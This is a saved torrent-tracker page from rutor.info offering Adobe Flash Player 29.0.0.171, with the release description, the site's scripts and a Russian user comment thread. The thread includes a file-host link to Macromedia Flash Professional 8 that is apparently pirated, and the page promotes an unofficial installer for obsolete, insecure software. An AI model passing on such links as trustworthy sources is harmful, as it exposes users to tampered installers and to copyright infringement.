@@ -1,0 +1,477 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Adobe Flash Player 29.0.0.171 Final (2018) PC</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Adobe Flash Player 29.0.0.171 Final (2018) PC</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:49cc51aa46a198a274f6f475da0ff6c52c816e3a&amp;dn=rutor.info_Adobe+Flash+Player+29.0.0.171+Final+%282018%29+PC&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=322170"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/322170"><img src="http://s.rutor.info/t/down.png"> Скачать Adobe_Flash_Player_29.0.0.171_Final.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><hr /><hr /><center><img src="http://s018.radikal.ru/i523/1709/94/e7deab005037.png" /></center><hr /><hr /><br />
+<br />
+<br />
+<img src="http://img11.lostpic.net/2016/12/13/3bdc2cc31dc579536266adced9494ac7.jpg" style="float:right;" /><br />
+<br />
+<br />
+<br />
+<br />
+<li><b>Версия программы</b>: 29.0.0.171<br />
+<li><b>Официальный сайт</b>: <a href="http://www.adobe.com/" target="_blank">ссылка</a><br />
+<li><b>Язык интерфейса</b>: Английский, Русский и другие<br />
+<li><b>Лечение</b>: не требуется<br />
+<br />
+<li><b><u>Системные требования</u></b>:<br />
+<i>Microsoft® Windows® XP (32 bit), Windows Server 2008 (32 bit), Windows Vista® (32 bit), Windows 7 (32 bit and 64 bit), Windows 8 (32 bit and 64 bit), or Windows Server 2012 (64 bit)<br />
+2.33GHz or faster x86-compatible processor, or Intel® Atom™ 1.6GHz or faster processor for netbooks<br />
+Internet Explorer 8.0 or later, Mozilla Firefox 17 or later, Google Chrome, or Opera 11<br />
+512MB of RAM (1GB of RAM recommended for netbooks); 128MB of graphics memory</i><br />
+<br />
+<li><b><u>Описание</u></b>:<br />
+Adobe® Flash® Player - плагин для браузеров Internet Explorer, AOL, Firefox, Mozilla, Netscape и Opera, позволяющий проигрывать Flash-ролики (файлы SWF). Без этой программы браузер будет некорректно отображать веб-страницы и интерактивные веб-элементы, разработанные по технологии Flash. Adobe® Flash® Player — это межплатформенная среда выполнения на основе браузера для доставки динамичных приложений, контента и видеоматериалов на различные экраны и браузеры. Среда Flash Player оптимизирована для создания высокоэффективных мобильных приложений и поддерживает оригинальные функциональные возможности устройств, обеспечивая удобство работы пользователей с созданными приложениями.<br />
+<br />
+<br />
+<br />
+<br />
+<hr /><hr /><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Проверить версию своего Flash Player&#039;а:</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://www.adobe.com/software/flash/about/" target="_blank">Ссылка</a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Дополнительная информация:</div><div class="hidebody"></div><textarea class="hidearea"><b>Adobe Flash Player</b> - проигрыватель файлов формата Flash (файлы SWF), имеет три вида дистрибутива:<br />
+<li>для браузера Internet Explorer<br />
+<li>для браузеров Firefox и Netscape<br />
+<li>для браузеров Opera и Chromium<br />
+<br />
+<b>install_flash_player_ax.exe</b> - Active-X для Windows (для браузера Internet Explorer)<br />
+<b>install_flash_player.exe</b> - плагин для Windows (для браузеров Firefox и Netscape)<br />
+<b>install_flash_player_ppapi.exe</b> - плагин для Windows (для браузеров Opera и Chromium)<br />
+<b>uninstall_flash_player.exe</b> - деинсталлятор для Windows (для всех браузеров)</li></li></li></textarea></div><hr /><hr /><br />
+<center><a href="http://lostpic.net/image/Qiaz" target="_blank"><img src="http://img11.lostpic.net/2016/12/13/22cca68edbb919c8f5f748ba9c12d4a9.th.jpg" /></a> <a href="http://lostpic.net/image/Qia3" target="_blank"><img src="http://img11.lostpic.net/2016/12/13/fd31280c70e601dac9dc3ae453d704bd.th.jpg" /></a> <a href="http://lostpic.net/image/Qiaf" target="_blank"><img src="http://img11.lostpic.net/2016/12/13/cbbfab53c81257afa19b42ecbd8020e1.th.jpg" /></a> <a href="http://lostpic.net/image/Qiao" target="_blank"><img src="http://img11.lostpic.net/2016/12/13/1d268df6cd425f548dd91246a17e60cd.th.jpg" /></a></center><br />
+<hr /><hr /></li></li></li></li></li></li></td></tr>
+
+<tr><td class="header">Оценка</td><td>9.8 из 10 (81 голосов, самая низкая оценка - 1, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/soft" target="_blank">Софт </a></td></tr>
+<tr><td class="header">Раздают</td><td>50</td></tr>
+<tr><td class="header">Качают</td><td>5</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (5 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 15:28:54  (16 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>60.50&nbsp;MB  (63441408 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 322170);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>15&nbsp;Янв&nbsp;14</td><td ><a class="downgif" href="http://d.rutor.info/download/329117"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:041920a7bcdb790505c2dbaea9faba6ea8e7833b&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/329117/adobe-flash-player-12.0.0.38/12.0.0.43-final-2014-pc">Adobe Flash Player 12.0.0.38/12.0.0.43 Final (2014) PC </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">33.56&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/9/0/0/Adobe Flash Player" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/322170.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (4)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=322170">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(322170);">Промодерировать раздачу</span> | <span onclick="confirm_delete(322170);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/322170">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>09-05-2018 3:15:52 (4 часа назад)</td> <td></td> <td align="right"><span id="c_3199658"></span><script type="text/javascript">cOptions(817041,3199658);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое За Обновку !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>igorLv</b></td> <td>13-03-2018 19:46:58 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3170771"></span><script type="text/javascript">cOptions(1537812,3170771);</script></td></tr><tr><td class="c_t" colspan=4><br />
+<fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />sasapai	14-11-2017 19:47:52 (4 месяца назад)		<br />
+Огромное спасибо. И от лица всех крымчан!</fieldset><br />
+<br />
+У меня в Севастополе прекрасно обновляется</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>AngryVanyok</b></td> <td>18-12-2017 22:51:11 (5 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3117505"></span><script type="text/javascript">cOptions(252298,3117505);</script></td></tr><tr><td class="c_t" colspan=4>найс</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>OverkillExample</b></td> <td>15-11-2017 20:51:43 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3097477"></span><script type="text/javascript">cOptions(1504026,3097477);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />-=DoMiNo=-		<br />
+Цитата<br />
+Кто-то писал:<br />
+OverkillExample<br />
+- Ну обнови=)) и тогда узнаешь что такое вирус...</fieldset><br />
+<br />
+Представь себе не узнаю. так как ссылка реальная и перекидывает на сайт адобе. да и в курсе такой байды типа надо обновить а потом запаришься удалять амиго и тд.<br />
+А проблема была совсем в другом. Я всё хоть и сделал по этой инструкции на сайте адобе.<br />
+<a href="https://helpx.adobe.com/flash-player/kb/uninstall-flash-player-windows.html" target="_blank">https://helpx.adobe.com/flash-player/kb/uninstall-flash-player-windows.html</a><br />
+<br />
+А оказалось. каким то образом и когда обновил и почистил заново установил. Тупо браузеры не запускали Флеш плеер. И никаких уведомлений не было об их включении. Как так получилось сам не понимаю. Всегда устанавливал отсюда сборки и всё было хорошо. Толи в браузерах что так как и в хроме и опере нужно было разрешать включение флеш плеера.<br />
+Сейчас вк настроен что этот сайт без всяких разрешений может запускать и всё работает.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>15-11-2017 17:57:00 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3097389"></span><script type="text/javascript">cOptions(805410,3097389);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />OverkillExample</fieldset> - Ну обнови=)) и тогда узнаешь что такое вирус...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>OverkillExample</b></td> <td>15-11-2017 17:42:57 (6 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3097381"></span><script type="text/javascript">cOptions(1504026,3097381);</script></td></tr><tr><td class="c_t" colspan=4>Не понятно почему но на некоторых приложениях в вк выводит что версия тип устарела и просит обновить а другие запускаются. Никогда такого не было. вирусов и тд ваще отпадает сразу. Первый раз столкнулся с таким. В чём может быть дело? Браузер опера и хром.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sasapai</b></td> <td>14-11-2017 19:47:52 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3096882"></span><script type="text/javascript">cOptions(305265,3096882);</script></td></tr><tr><td class="c_t" colspan=4>Огромное спасибо. И от лица всех крымчан!<br />
+Здоровья Вам и всем вашим близким.<br />
+Что б мы без Вас делали...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>26-10-2017 20:50:32 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3083742"></span><script type="text/javascript">cOptions(805410,3083742);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />stranger7575500</fieldset> - в раздаче также и оригинальные файлы с оф сайта=)) вы невнимательны.. и если почитали посты ниже - то поняли-б что с флешем проблемы в Крыму..</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>stranger7575500</b></td> <td>26-10-2017 18:40:24 (6 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3083594"></span><script type="text/javascript">cOptions(288952,3083594);</script></td></tr><tr><td class="c_t" colspan=4>Автору конечно спасибо за проделанную работу. Но всё же лучше ставить оригинал. Просто я когда то ставил вот такие же сборки и поверте в итоге приходилось их удалять и ставить с оф.сайта.(рано или поздно господа будут проблемы). Но решает каждый сам. Десятка только за труд.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>M@LEK</b></td> <td>20-10-2017 22:09:14 (7 месяцев назад)</td> <td></td> <td align="right"><span id="c_3079963"></span><script type="text/javascript">cOptions(834834,3079963);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pazzl13</b></td> <td>18-10-2017 22:26:27 (7 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3078920"></span><script type="text/javascript">cOptions(1234769,3078920);</script></td></tr><tr><td class="c_t" colspan=4>Рекомендую всем как решение проблемы &quot;Не устанавливается Adobe Flash Player — ошибка инициализации приложения&quot;.Здесь в раздаче полноценный установочный пакет.Автору респект.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Gorefest_666</b></td> <td>16-10-2017 22:26:19 (7 месяцев назад)</td> <td></td> <td align="right"><span id="c_3077775"></span><script type="text/javascript">cOptions(1370770,3077775);</script></td></tr><tr><td class="c_t" colspan=4>Adobe Flash Player обновился 16 октября до версии 27.0.0.170</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>PAVeLSID1981</b></td> <td>11-10-2017 9:44:54 (7 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3073634"></span><script type="text/javascript">cOptions(1488812,3073634);</script></td></tr><tr><td class="c_t" colspan=4>эти финалы по ходу никогда не закончатся.помню 24.0 финал был уже 27.раздающему спасибо забрал червонец</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Emins</b></td> <td>08-08-2017 22:42:13 (9 месяцев назад)</td> <td></td> <td align="right"><span id="c_3039936"></span><script type="text/javascript">cOptions(781986,3039936);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>5274282</b></td> <td>25-06-2017 16:08:41 (11 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3018037"></span><script type="text/javascript">cOptions(635146,3018037);</script></td></tr><tr><td class="c_t" colspan=4>спасибо всё работает</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Emins</b></td> <td>14-06-2017 8:28:25 (11 месяц назад)</td> <td>Оценил на: <b>5</b></td> <td align="right"><span id="c_3011998"></span><script type="text/javascript">cOptions(781986,3011998);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/cupidgirl.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>00plac00</b></td> <td>30-04-2017 16:44:30 (12 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2986200"></span><script type="text/javascript">cOptions(1309672,2986200);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /> из Крыма</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Radjah</b></td> <td>12-04-2017 18:09:56 (13 месяца назад)</td> <td></td> <td align="right"><span id="c_2975462"></span><script type="text/javascript">cOptions(1161898,2975462);</script></td></tr><tr><td class="c_t" colspan=4>Благодарю!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>force22</b></td> <td>21-03-2017 10:45:14 (14 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2960897"></span><script type="text/javascript">cOptions(263952,2960897);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>333444555</b></td> <td>15-03-2017 14:42:35 (14 месяца назад)</td> <td></td> <td align="right"><span id="c_2957178"></span><script type="text/javascript">cOptions(1280247,2957178);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Tra-Ta-Ta-Рuk</b></td> <td>17-02-2017 4:06:13 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2938704"></span><script type="text/javascript">cOptions(1087588,2938704);</script></td></tr><tr><td class="c_t" colspan=4><b>SMT22</b> СПАСИБО за Престо! Сразу ощутил, он медленней чем v11, но другим браузерам нравится )) </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SMT22</b></td> <td>15-02-2017 8:53:20 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2937423"></span><script type="text/javascript">cOptions(310552,2937423);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Что-то не понимаю. А нельзя просто скачать с офф. сайта, или обновить свой?</fieldset><br />
+<br />
+Можно конечно и с офф.сайта. Вот прямые постоянные ссылки на новые дистрибутивы:<br />
+<br />
+<b>Для Firefox, Safari, Opera (Presto):</b><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скрытый текст</div><div class="hidebody"></div><textarea class="hidearea">[url]http://fpdownload.macromedia.com/pub/flashplayer/latest/help/install_flash_player.exe<br />
+</textarea></div>[/url]<br />
+<b>Для Internet Explorer:</b><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скрытый текст</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://fpdownload.macromedia.com/pub/flashplayer/latest/help/install_flash_player_ax.exe" target="_blank">http://fpdownload.macromedia.com/pub/flashplayer/latest/help/install_flash_player_ax.exe</a></textarea></div><br />
+<b>Для Opera (Blink) and Chromium браузеров:</b><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скрытый текст</div><div class="hidebody"></div><textarea class="hidearea">[url]http://fpdownload.macromedia.com/pub/flashplayer/latest/help/install_flash_player_ppapi.exe<br />
+</textarea></div>[/url]<br />
+<b>Для удаления Adobe Flash Player:</b><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скрытый текст</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://download.macromedia.com/get/flashplayer/current/support/uninstall_flash_player.exe" target="_blank">http://download.macromedia.com/get/flashplayer/current/support/uninstall_flash_player.exe</a></textarea></div><br />
+<br />
+Только надо иметь ввиду, что ни Firefox ни Google Chrome больше не поддерживают Adobe Flash. Установить конечно можно его, но при каждой попытке просмотра контента Adobe Flash будет надо отдельно подтверждать разрешение на запуск. Adobe Flash небезопасен - это основная причина, почему от него все отказываются.<br />
+Если уж совсем надо посмотреть что-либо и у вас Windows 8.1 и выше, то зайдите на нужный сайт через Internet Explorer (Adobe Flash в него изначально встроен и обновляется вместе с Windows Update) </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Boris Nic</b></td> <td>14-02-2017 18:45:09 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2937094"></span><script type="text/javascript">cOptions(1293110,2937094);</script></td></tr><tr><td class="c_t" colspan=4>Что-то не понимаю. А нельзя просто скачать с офф. сайта, или обновить свой? Пользуюсь мозиллой, заглянул в плагины - у меня Shockwave Flash 13.0.0.259</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Nyshasawa</b></td> <td>14-02-2017 13:17:21 (15 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2936919"></span><script type="text/javascript">cOptions(1481416,2936919);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thumbsup.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Hagal78 </b></td> <td>12-01-2017 11:24:46 (16 месяцев назад)</td> <td></td> <td align="right"><span id="c_2913848"></span><script type="text/javascript">cOptions(13701,2913848);</script></td></tr><tr><td class="c_t" colspan=4>Подскажите,я вреде слышал что этот плеер уже не использует мазила и опера. У них там какой-то стандартный теперь. Или я что-то не так понял?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>10-01-2017 19:28:59 (16 месяцев назад)</td> <td></td> <td align="right"><span id="c_2912873"></span><script type="text/javascript">cOptions(805410,2912873);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><b>nazghul</b>		<br />
+Вот бы кто выложил Macromedia Flash...</fieldset><br />
+<br />
+<b><a href="http://sendfile.su/1297944" target="_blank">Macromedia Flash Professional v8.0</a></b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>10-01-2017 18:31:20 (16 месяцев назад)</td> <td></td> <td align="right"><span id="c_2912818"></span><script type="text/javascript">cOptions(817041,2912818);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое за обновки !!! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>jin92rus</b></td> <td>26-12-2016 13:24:45 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2903021"></span><script type="text/javascript">cOptions(1251568,2903021);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Христофоr</b></td> <td>14-12-2016 20:41:42 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2895197"></span><script type="text/javascript">cOptions(1466565,2895197);</script></td></tr><tr><td class="c_t" colspan=4>sc most,только что проверил на 12-й: видео норм, звук эффект эха (сам пользовал оперу, но в поздней версии она исключила флэш). Если что нужно, заскринь, а так чё голову ломать- <br />
+-Лучше старенький ТТ чем дзюдо и карате!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sc most</b></td> <td>14-12-2016 6:05:09 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2894827"></span><script type="text/javascript">cOptions(1403169,2894827);</script></td></tr><tr><td class="c_t" colspan=4><b>Христофоr</b>, немогу назвать причины, но для меня переход не вариант. Хотя есть и мозилла и хром, но...  Нужна именно О-12. Так еще и фишка в том что она не поддерживает те расширения, которыми можно принудительно включить флэш. Печаль.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Христофоr</b></td> <td>13-12-2016 23:54:40 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2894735"></span><script type="text/javascript">cOptions(1466565,2894735);</script></td></tr><tr><td class="c_t" colspan=4>sc most, тоже было: выход-1 переход на Mozilla,2-Maxton (в opera отказались от флэш  плеера);последний неприхотлив, оперативен.  </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sc most</b></td> <td>13-12-2016 20:27:13 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2894626"></span><script type="text/javascript">cOptions(1403169,2894626);</script></td></tr><tr><td class="c_t" colspan=4>Не могу включить Flash Player на ютьюбе в Opera 12. Хана все перепробовал, хеши куки, на странице https:**www.youtube.com*html5 даже кнопки нет перехода. Задолбал HTML5. Тормозит, половину видео воспроизводит на половину, еще половину вообще прото тупо не воспроизводит... 